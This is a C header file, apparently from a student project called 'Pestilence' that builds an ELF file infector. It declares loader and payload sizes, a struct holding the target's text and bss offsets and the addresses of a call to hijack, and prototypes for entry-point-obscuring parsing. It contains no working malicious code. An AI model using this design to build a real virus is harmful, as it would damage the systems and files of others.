#ifndef PESTILENCE_H
# define PESTILENCE_H

# include <elf.h>
# include <unistd.h>
# include <stdlib.h>
# include <stdio.h>
# include <sys/mman.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>

# define END_SIZE 0x1B + 0x5
# define PAYLOAD_SIZE 0x38 + 0x5
# define LOADER_SIZE 0x43

typedef struct		s_info
{
	void		*file;
	size_t		file_size;
	void		*text_begin;
	size_t		text_size;
	size_t		text_addr;

	void		*addr_call_to_replace;
	void		*addr_hooked_func;

	size_t		bss_size;
	size_t		begin_bss;
	size_t		offset_payload;
	size_t		addr_payload;

	int32_t		 valid_target;
}					t_info;

void		loader();
int			main();
void		ft_end();
void		woody();

/*			**** PARSING ****					*/
void		find_text(t_info *info);
void		epo_parsing(t_info *info);
void		pe_parsing(t_info *info);

/*			**** LIB HANDLERS	****			*/
void		ft_memcpy(void *dest, void *src, size_t size);
void		ft_bzero(void *ptr, size_t size);

#endif
